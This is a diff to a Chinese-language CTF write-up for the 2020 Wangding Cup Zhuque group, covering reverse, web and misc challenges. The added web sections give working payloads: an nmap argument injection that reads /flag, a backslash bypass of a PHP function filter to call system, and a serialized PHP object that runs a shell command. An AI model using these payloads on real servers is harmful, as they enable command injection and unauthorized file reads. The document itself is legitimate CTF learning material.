@@ -3,7 +3,11 @@
 * TOC
 {:toc}
 
+
+
 # 2020_网鼎杯朱雀组writeup
+
+https://pan.baidu.com/s/19wKjwIqa-w-o-Wel3jpw_A 提取码: ewpy
 
 ## reverse 0x1 go
 
@@ -56,6 +60,8 @@ print(data)
 ```
 
 ## reverse 0x2 tree
+
+二叉树
 
 https://www.52pojie.cn/thread-1181476-1-1.html
 
@@ -123,13 +129,19 @@ flag为flag{afa41fc8-574f-1248-1a84-9d7f7120f89c}
 
 提取码：sca9
 
+## web 0x1 nmap
+
+127.0.0.1' -iL /flag -oN vege.txt '
+
+`nmap 127.0.0.1' -iL /flag -oN vege.txt '`
+
 ## web 0x2 phpweb
 
 看源码, 能提交func和p, 看value可知func是函数名, p 是参数。
 
 func=file_get_contents&p=index.php看源码。
 
-过滤了常用看system等，通过加\来过
+过滤了常用看system等，通过加\来过, linux下的 \system = system, ca\t = cat
 
 1.先找flag位置
 
@@ -139,6 +151,28 @@ func=file_get_contents&p=index.php看源码。
 
 `http://xxx.ichunqiu.com/index.php?func=\system&p=cat /tmp/flagoefiu4r93`
 
+### 方法2 反序列化
+
+```php
+<?php
+function is_valid($s) {
+    for($i = 0; $i < strlen($s); $i++)
+        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
+            return false;
+    return true;
+}
+
+class Test {
+    public $func='system';
+    public $p='find / -name flag*';
+}
+
+echo serialize(new Test());
+?>
+```
+生成payload
+
+> func=unserialize&p=O:4:"Test":2:{s:4:"func";s:6:"system";s:1:"p";s:18:"find / -name flag*";}
 ## misc 0x2 九宫格
 
 根据二维码识别出二进制字符串，一共576位，576位转换成TEXT文本。题目提示的九宫格拼出的数字是245568。利用rabbit解密，对前面的TEXT文本进行解密，解密下方填上245568.即可得到解密flag
@@ -181,3 +215,6 @@ key 是 245568。
 96959669566a5655699669aa5656966a566a56656
 ```
 [曼切斯特与差分曼切斯特](https://skysec.top/2017/07/10/曼切斯特与差分曼切斯特/)  ?
+
+
+[参考](https://blog.csdn.net/qq_40568770/article/details/106185293)
